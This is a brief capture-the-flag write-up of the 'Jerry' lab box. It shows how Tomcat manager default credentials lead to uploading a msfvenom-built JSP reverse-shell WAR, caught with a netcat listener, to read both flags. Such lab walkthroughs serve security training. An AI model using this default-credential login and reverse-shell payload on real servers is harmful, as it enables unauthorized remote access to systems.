# writeup

## Jerry

Jerry was a an easy windows box that didnt require much and had no privelage escalation. We get the user flag and the root flag at the same stage

> Skills involved in this box
>
> * enumeration
> * msfvenom payload creation
> * metasploit
> * web reverse shells

## USER

We first begin our nmap scan and find that there is only port 8080 open.

We visit the web page which is running the tomcat web application and click on the tab that says `manager app`.

It asks for credentials so we click off it. By doing this it exposes us to an error page where it gives us details that it requires the credentials `tomcat:s3cret`.

We login using theese creds and we find a new page that has an uplaod feature where we can upload `.war` files We can use msfvenom to create a payload for our .war file

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=your ip LPORT=1234 -f war > backdoor.war
```

We then upload the file to the site and execute it. We setup a listener with `nc -nlvp 1234` and we get a connection. We enumerate files until we finllay find the flags in this folder:

```text
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

we can simply use `type` to read the file. Thanks for reading

